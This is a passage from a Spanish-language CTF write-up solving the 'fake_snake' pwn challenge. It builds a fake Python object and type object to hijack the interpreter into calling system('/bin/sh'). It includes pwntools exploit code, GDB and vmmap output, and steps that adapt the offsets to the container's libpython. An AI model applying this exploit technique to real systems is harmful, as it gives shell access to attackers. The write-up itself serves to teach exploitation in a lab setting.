#14 <span class="code-dark-yellow">run_mod</span> (<span class="code-dark-cyan">mod</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">filename=filename@entry</span>=0x7ff0a47a23b0, <span class="code-dark-cyan">globals=globals@entry</span>=0x7ff0a4802a80, <span class="code-dark-cyan">locals=locals@entry</span>=0x7ff0a4802a80, <span class="code-dark-cyan">flags=flags@entry</span>=0x7ffcbbcb58e8, <span class="code-dark-cyan">arena=arena@entry</span>=0x7ff0a47277b0) at <span class="code-dark-green">Python/pythonrun.c</span>:1735
#15 <span class="code-dark-blue">0x000055f82dd87102</span> in <span class="code-dark-yellow">pyrun_file</span> (<span class="code-dark-cyan">flags</span>=0x7ffcbbcb58e8, <span class="code-dark-cyan">closeit</span>=0x1, <span class="code-dark-cyan">locals</span>=0x7ff0a4802a80, <span class="code-dark-cyan">globals</span>=0x7ff0a4802a80, <span class="code-dark-cyan">start</span>=0x101, <span class="code-dark-cyan">filename</span>=0x7ff0a47a23b0, <span class="code-dark-cyan">fp</span>=0x55f82e7ea230) at <span class="code-dark-green">Python/pythonrun.c</span>:1630
#16 <span class="code-dark-yellow">_PyRun_SimpleFileObject</span> (<span class="code-dark-cyan">fp=fp@entry</span>=0x55f82e7ea230, <span class="code-dark-cyan">filename=filename@entry</span>=0x7ff0a47a23b0, <span class="code-dark-cyan">closeit=closeit@entry</span>=0x1, <span class="code-dark-cyan">flags=flags@entry</span>=0x7ffcbbcb58e8) at <span class="code-dark-green">Python/pythonrun.c</span>:440
#17 <span class="code-dark-blue">0x000055f82dd8768f</span> in <span class="code-dark-yellow">_PyRun_AnyFileObject</span> (<span class="code-dark-cyan">fp</span>=0x55f82e7ea230, <span class="code-dark-cyan">filename=filename@entry</span>=0x7ff0a47a23b0, <span class="code-dark-cyan">closeit=closeit@entry</span>=0x1, <span class="code-dark-cyan">flags=flags@entry</span>=0x7ffcbbcb58e8) at <span class="code-dark-green">Python/pythonrun.c</span>:79
#18 <span class="code-dark-blue">0x000055f82ddaa28b</span> in <span class="code-dark-yellow">pymain_run_file_obj</span> (<span class="code-dark-cyan">skip_source_first_line</span>=0x0, <span class="code-dark-cyan">filename</span>=0x7ff0a47a23b0, <span class="code-dark-cyan">program_name</span>=0x7ff0a4802c70) at <span class="code-dark-green">Modules/main.c</span>:360
#19 <span class="code-dark-yellow">pymain_run_file</span> (<span class="code-dark-cyan">config</span>=0x55f82e052ea0 &lt;_PyRuntime+59904&gt;) at <span class="code-dark-green">Modules/main.c</span>:379
#20 <span class="code-dark-yellow">pymain_run_python</span> (<span class="code-dark-cyan">exitcode=exitcode@entry</span>=0x7ffcbbcb5a40) at <span class="code-dark-green">Modules/main.c</span>:601
#21 <span class="code-dark-blue">0x000055f82ddaa97f</span> in <span class="code-dark-yellow">Py_RunMain</span> () at <span class="code-dark-green">Modules/main.c</span>:680
#22 <span class="code-dark-yellow">pymain_main</span> (<span class="code-dark-cyan">args</span>=0x7ffcbbcb5a00) at <span class="code-dark-green">Modules/main.c</span>:710
#23 <span class="code-dark-yellow">Py_BytesMain</span> (<span class="code-dark-cyan">argc</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">argv</span>=&lt;optimized out&gt;) at <span class="code-dark-green">Modules/main.c</span>:734
#24 <span class="code-dark-blue">0x00007ff0a501b083</span> in <span class="code-dark-yellow">__libc_start_main</span> (<span class="code-dark-cyan">main</span>=0x55f82dbb6dd0 &lt;main&gt;, <span class="code-dark-cyan">argc</span>=0x2, <span class="code-dark-cyan">argv</span>=0x7ffcbbcb5b68, <span class="code-dark-cyan">init</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">fini</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">rtld_fini</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">stack_end</span>=0x7ffcbbcb5b58) at <span class="code-dark-green">../csu/libc-start.c</span>:308
#25 <span class="code-dark-blue">0x000055f82dbc38de</span> in <span class="code-dark-yellow">_start</span> () at <span class="code-dark-green">Objects/object.c</span>:1301
</code></pre></div><p>Hemos ejecutado <code>system</code>. En realidad, podemos ver que se ejecuta desde <code>PyObject_Str</code>, Entonces probablemente de <code>__str__</code> y no <code>__repr__</code>. Bueno, pero estamos cerca de explotar este programa. Observe que tenemos un poco de control sobre <code>$rdi</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/s $rdi
<span class="code-dark-blue">0x7ff0a45c4f18</span>: "\023"
<span class="code-green">gef➤  </span>x/gx $rdi
<span class="code-dark-blue">0x7ff0a45c4f18</span>: 0x0000000000000013  
</code></pre></div><p>Observe que establecemos <code>0x11</code> como <code>refcnt</code> en el <em>fake</em> <code>PyObject</code>, y ahora estamos viendo <code>0x13</code>. Este campo lo aumenta/disminuye el intérprete de Python de acuerdo con el número de referencias al objeto. Por lo tanto, podemos agregar <code>"/bin/sh\0"</code> en formato hexadecimal (<em>little-endian</em>) y restar <code>2</code>. Si no lo crees, solo dale a <code>continue</code> en el depurador:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[<span class="code-red">DEBUG</span>] Received 0x14 bytes:
    00000000  73 68 3a 20  31 3a 20 <span class="code-dark-blue">13</span>  3a 20 6e 6f  74 20 66 6f  │sh: <span class="code-dark-blue">│</span>1: <span class="code-dark-blue">·│</span>: no<span class="code-dark-blue">│</span>t fo│  
    00000010  75 6e 64 <span class="code-dark-red">0a</span>                                         │und<span class="code-dark-red">·</span>│
    00000014
sh: 1: \x13 not found
<span class="code-red">$</span>
</code></pre></div><p>Entonces, debemos actualizar la última parte del <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">fake_type_obj_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">type_obj</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">fake_obj_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk8">sp64</span><span class="mtk1">(u64(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk1">fake_type_obj_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">))</span>  

<span class="mtk1">    </span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">fake_obj_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk9 mtki">do_recv</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Desactivemos GDB y el modo depuración&mldr; y tenemos una <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process '/usr/local/bin/python3.11': pid 862795  
[<span class="code-blue">*</span>] id(0) = 0x56148b0867e8
[<span class="code-green">+</span>] Python base address: 0x56148ab09000
[<span class="code-blue">*</span>] '/usr/local/bin/python3.11'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    FORTIFY:  <span class="code-dark-green">Enabled</span>
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
build_docker.sh  challenge  Dockerfile    solve.py  test.py
</code></pre></div><p>Probemos con el contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done  
[<span class="code-blue">*</span>] id(0) = 0x7f33f7ce9288
[<span class="code-green">+</span>] Python base address: 0x7f33f776baa0
[<span class="code-blue">*</span>] '/usr/local/bin/python3.11'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    FORTIFY:  <span class="code-dark-green">Enabled</span>
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>Ay&mldr; No funciona&mldr; Probablemente porque la versión de Python que tenemos tiene símbolos de depuración o algo.</p><h3 id="arreglando-el-_exploit_">Arreglando el <em>exploit</em></h3><p>Tomemos el binario <code>python3.11</code> del contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green mtku">sudo</span> <span class="code-dark-green">docker</span> stop pwn_fake_snake
pwn_fake_snake

<span class="code-cyan">$</span> <span class="code-dark-green mtku">sudo</span> <span class="code-dark-green">docker</span> run --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">${PWD}</span>:/opt"</span> -it pwn_fake_snake bash
I have no name!@836ac3d72fd1:/$ which python3.11
/usr/local/bin/python3.11
I have no name!@836ac3d72fd1:/$ cp /usr/local/bin/python3.11 /opt  
I have no name!@836ac3d72fd1:/$ exit
exit
</code></pre></div><p>Sin embargo, necesitamos una librería llamada <code>libpython3.11.so.1.0</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./python3.11</span>
./python3.11: error while loading shared libraries: libpython3.11.so.1.0: cannot open shared object file: No such file or directory  

<span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">./python3.11</span>
        linux-vdso.so.1 (0x00007fffea1d4000)
        libpython3.11.so.1.0 =&gt; not found
        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007efe6a6e4000)
        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007efe6a6de000)
        libutil.so.1 =&gt; /lib/x86_64-linux-gnu/libutil.so.1 (0x00007efe6a6d9000)
        libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007efe6a58a000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007efe6a396000)
        /lib64/ld-linux-x86-64.so.2 (0x00007efe6a729000)
</code></pre></div><p>Entonces, la cogemos y parcheamos el binario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green mtku">sudo</span> <span class="code-dark-green">docker</span> run --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">${PWD}</span>:/opt"</span> -it pwn_fake_snake bash
I have no name!@3d417a55032b:/$ ldd /usr/local/bin/python3.11
        linux-vdso.so.1 (0x00007ffc41fd8000)
        libpython3.11.so.1.0 =&gt; /usr/local/bin/../lib/libpython3.11.so.1.0 (0x00007fb1133f0000)  
        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb1133cd000)
        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fb1133c8000)
        libutil.so.1 =&gt; /lib/x86_64-linux-gnu/libutil.so.1 (0x00007fb1133c3000)
        libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fb113240000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb113080000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb113987000)
I have no name!@3d417a55032b:/$ cp /usr/local/bin/../lib/libpython3.11.so.1.0 /opt
I have no name!@3d417a55032b:/$ exit
exit

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-rpath <span class="mtku">.</span> <span class="mtku">python3.11</span>

<span class="code-cyan">$</span> <span class="code-dark-green">./python3.11</span> -q
&gt;&gt;&gt; exit()
</code></pre></div><p>Ahora lo tenemos funcionando de nuevo. Agreguemos esto encima del <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">python</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'./python3.11'</span><span class="mtk1">)</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">process</span><span class="mtk1">([</span><span class="mtk4">'./python3.11'</span><span class="mtk1">, </span><span class="mtk4">'challenge/server.py'</span><span class="mtk1">], </span><span class="mtk9 mtki">level</span><span class="mtk5">=</span><span class="mtk4">'DEBUG'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1">)</span>
</code></pre></div><p>Si ejecutamos el <em>exploit</em> tal como está, recibiremos un error que dice que <code>python.plt.system</code> no existe. Entonces, podemos comentar esta parte e intentarlo nuevamente con GDB adjunto al proceso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './python3.11'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './python3.11' argv=[b'./python3.11', b'challenge/server.py'] : pid 876053
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './python3.11', '876053', '-x', '/tmp/pwnfa1izjyv.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-red">DEBUG</span>] Received 0x55 bytes:
    b'Zero: 140083410526856\n'
    b'0) Add To Store\n'
    b'1) Remove From Store\n'
    b'2) Load Address\n'
    b'Selection:'
[<span class="code-blue">*</span>] id(0) = 0x7f67b5ec6288
[<span class="code-green">+</span>] Python base address: 0x7f67b5948aa0
[<span class="code-blue">*</span>] Switching to interactive mode
1) Add To Store
2) Remove From Store
3) Load Address
Selection:<span class="code-red">$</span>
</code></pre></div><p>Lo primero que notamos es que la dirección base no es correcta. Además, la dirección de <code>0</code> ya no está dentro del binario sino en una librería:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>vmmap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-green">Heap</span> | <span class="code-dark-magenta">Stack</span> ]
<span class="code-dark-blue">Start              End                Offset             Perm Path</span>
0x000055fadf1c6000 0x000055fadf1c7000 0x0000000000000000 r-- ./python3.11
<span class="code-dark-red">0x000055fadf1c7000</span> <span class="code-dark-red">0x000055fadf1c8000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./python3.11</span>
0x000055fadf1c8000 0x000055fadf1c9000 0x0000000000002000 r-- ./python3.11
0x000055fadf1c9000 0x000055fadf1ca000 0x0000000000002000 r-- ./python3.11
0x000055fadf1ca000 0x000055fadf1cb000 0x0000000000003000 rw- ./python3.11
<span class="code-dark-green">0x000055fadfa49000</span> <span class="code-dark-green">0x000055fadfada000</span> <span class="code-dark-green">0x0000000000000000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">[heap]</span>
0x00007f67b4ba5000 0x00007f67b4bac000 0x0000000000000000 r-- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so  
<span class="code-dark-red">0x00007f67b4bac000</span> <span class="code-dark-red">0x00007f67b4bbd000</span> <span class="code-dark-red">0x0000000000007000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so</span>
0x00007f67b4bbd000 0x00007f67b4bc3000 0x0000000000018000 r-- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so
0x00007f67b4bc3000 0x00007f67b4bc4000 0x000000000001d000 r-- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so
0x00007f67b4bc4000 0x00007f67b4bc8000 0x000000000001e000 rw- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so
0x00007f67b4bc8000 0x00007f67b4e2a000 0x0000000000000000 rw-
0x00007f67b4e2a000 0x00007f67b5613000 0x0000000000000000 r-- /usr/lib/locale/locale-archive
0x00007f67b5613000 0x00007f67b5618000 0x0000000000000000 rw-
0x00007f67b5618000 0x00007f67b563a000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
<span class="code-dark-red">0x00007f67b563a000</span> <span class="code-dark-red">0x00007f67b57b2000</span> <span class="code-dark-red">0x0000000000022000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/lib/x86_64-linux-gnu/libc-2.31.so</span>
0x00007f67b57b2000 0x00007f67b5800000 0x000000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
0x00007f67b5996000 0x00007f67b5997000 0x000000000000a000 rw- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007f67b5997000 0x00007f67b599b000 0x0000000000000000 rw-
0x00007f67b599b000 0x00007f67b59a2000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
0x00007f67b59a2000 0x00007f67b5a90000 0x0000000000000000 r-- ./libpython3.11.so.1.0
<span class="code-dark-red">0x00007f67b5a90000</span> <span class="code-dark-red">0x00007f67b5cb3000</span> <span class="code-dark-red">0x00000000000ee000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./libpython3.11.so.1.0</span>
0x00007f67b5cb3000 0x00007f67b5d90000 0x0000000000311000 r-- ./libpython3.11.so.1.0
0x00007f67b5d90000 0x00007f67b5dbe000 0x00000000003ed000 r-- ./libpython3.11.so.1.0
0x00007f67b5dbe000 0x00007f67b5eef000 0x000000000041b000 rw- ./libpython3.11.so.1.0
0x00007f67b5eef000 0x00007f67b5f34000 0x0000000000000000 rw-
0x00007f67b5f34000 0x00007f67b5f35000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
<span class="code-dark-red">0x00007f67b5f35000</span> <span class="code-dark-red">0x00007f67b5f58000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/lib/x86_64-linux-gnu/ld-2.31.so</span>
0x00007f67b5f58000 0x00007f67b5f60000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f67b5f61000 0x00007f67b5f62000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f67b5f62000 0x00007f67b5f63000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f67b5f63000 0x00007f67b5f64000 0x0000000000000000 rw-
<span class="code-dark-magenta">0x00007ffcf47ce000</span> <span class="code-dark-magenta">0x00007ffcf47ef000</span> <span class="code-dark-magenta">0x0000000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]</span>
0x00007ffcf47f3000 0x00007ffcf47f7000 0x0000000000000000 r-- [vvar]
<span class="code-dark-red">0x00007ffcf47f7000</span> <span class="code-dark-red">0x00007ffcf47f9000</span> <span class="code-dark-red">0x0000000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">[vdso]</span>
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
</code></pre></div><p>En realidad, la dirección de <code>0</code> pertenece a <code>libpython3.11.so.1.0</code>. Probablemente, podemos realizar el <em>exploit</em> usando esta librería como si fuera un binario. Este es el <em>offset</em> necesario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p/d 0x7f67b5ec6288 - 0x00007f67b59a2000  
$1 = 5390984
</code></pre></div><p>Actualizamos el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">python</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'libpython3.11.so.1.0'</span><span class="mtk1">)</span>


<span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span>()

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Zero: '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">zero_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'id(0) = </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">zero_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">python.address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">zero_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">5390984</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Python base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">python.address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">type_obj</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">acdc1337</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk1">python</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.system) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">100</span>

<span class="mtk1">    </span><span class="mtk1">fake_type_obj_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">type_obj</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">fake_obj_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk8">sp64</span><span class="mtk1">(u64(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk1">fake_type_obj_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">))</span>  

<span class="mtk1">    </span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">fake_obj_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk9 mtki">do_recv</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span>()
</code></pre></div><p>Y tenemos una <em>shell</em> de nuevo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './libpython3.11.so.1.0'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Starting local process './python3.11': pid 882238
[<span class="code-blue">*</span>] id(0) = 0x7fd0f67cb288
[<span class="code-green">+</span>] Python base address: 0x7fd0f62a7000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
build_docker.sh  Dockerfile           python3.11  test.py  
challenge     libpython3.11.so.1.0  solve.py
</code></pre></div><p>Y también en el contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green mtku">sudo</span> <span class="code-dark-green">docker</span> run --rm --name pwn_fake_snake -p 1337:1337 -d pwn_fake_snake  
c1af67fd6faac1b3b6cca10a6eb046c5d263b571564b1370123bae335bc5f7e9

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337
[<span class="code-blue">*</span>] './libpython3.11.so.1.0'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
